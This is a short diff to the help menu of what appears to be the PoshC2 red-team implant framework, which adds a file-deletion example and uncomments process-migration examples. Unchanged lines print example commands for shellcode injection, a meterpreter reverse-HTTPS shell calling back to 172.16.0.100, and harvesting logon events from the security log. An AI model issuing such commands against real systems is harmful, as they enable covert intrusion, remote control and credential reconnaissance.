@@ -464,6 +464,7 @@ $header = '
         write-host " Get-System-WithDaisy" -ForegroundColor Green 
         write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
         write-host " Get-Pid" -ForegroundColor Green 
+        write-host " Posh-Delete C:\Temp\svc.exe" -ForegroundColor Green
         write-host " Get-Webpage http://intranet" -ForegroundColor Green 
         write-host " ListModules " -ForegroundColor Green
         write-host " ModulesLoaded " -ForegroundColor Green 
@@ -618,13 +619,13 @@ $header = '
         write-host " Migrate" -ForegroundColor Green
         write-host " Migrate -ProcID 444" -ForegroundColor Green
         write-host " Migrate -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        #write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
-        #write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        #write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
-        #write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
-        #write-host " Migrate-Proxy-x64 -ProcID 444" -ForegroundColor Green
-        #write-host " Migrate-Daisy-x86 -Name DC1  -ProcID 444" -ForegroundColor Green
-        #write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
+        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
+        write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
+        write-host " Migrate-Proxy-x64 -ProcID 444" -ForegroundColor Green
+        write-host " Migrate-Daisy-x86 -Name DC1  -ProcID 444" -ForegroundColor Green
+        write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
         write-host " Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
